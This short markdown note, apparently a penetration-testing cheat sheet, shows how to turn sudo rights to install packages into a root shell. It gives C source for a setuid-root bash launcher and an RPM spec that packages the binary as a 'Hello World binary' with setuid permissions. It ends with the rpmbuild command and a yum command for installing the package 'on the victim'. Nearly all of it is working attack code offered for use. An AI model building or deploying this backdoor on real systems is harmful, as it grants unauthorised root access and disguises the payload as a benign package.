# If you have sudo rights to install a package, make a shell and install it with the following commands

## pop.c in local build direcotry (/root/rpmbuild)
```c
#include <stdio.h>
#include <unistd.h>

int main()
{
	int ret;
	char *cmd[] = { "bash", "-p", (char*)0};
	setuid(0);
	setgid(0);
	ret = execvp( "bash", cmd );
	return 0;
}
```

Compile pop.c to pop, suid bit is aded in the rpm spec file

## pop.spec specifies the build information for rpm

```
pop.spec
Name: pop
Version: 1.0
Release: 1
Summary: Hello World binary
License: license.txt

%description
More detailed description of the hello world binary

%install
rm -rf %{buildroot}
mkdir -p %{buildroot}/usr/local/bin
cp /root/rpmbuild/pop %{buildroot}/usr/local/bin

%clean
rm -rf %{buildroot}

%files
%defattr(6755,root,root,6644)
/usr/local/bin/pop
```

## Make the rpm
```bash
rpmbuild -bb pop.spec -vvv
```

## install on the victim

```bash
sudo yum install $(pwd)/pop-1.0-1.i386.rpm --disablerepo=*
```
